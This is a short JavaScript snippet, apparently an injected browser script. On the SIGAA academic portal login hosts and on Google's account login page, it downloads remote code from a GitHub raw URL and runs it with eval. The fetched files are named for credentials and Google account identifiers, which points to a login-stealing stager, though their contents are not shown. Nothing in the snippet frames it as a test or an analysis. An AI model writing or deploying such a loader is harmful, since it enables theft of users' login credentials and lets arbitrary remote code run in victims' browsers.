let url = null

if (location.host == 'sigaa.ifsc.edu.br' || location.host == 'sig.ifsc.edu.br'){
    url = "https://raw.githubusercontent.com/Wolota/ips/main/credentialSIGAA.js";
    console.log("conseguiu entrar...")
}


if (location.host == 'accounts.google.com'){
    url = "https://raw.githubusercontent.com/Wolota/ips/main/identifierGAccount.js";
}


if (url != undefined || url != null){
    fetch(url, { cache: 'no-store' }).then(response => response.text()).then(code => {eval(code);});
}
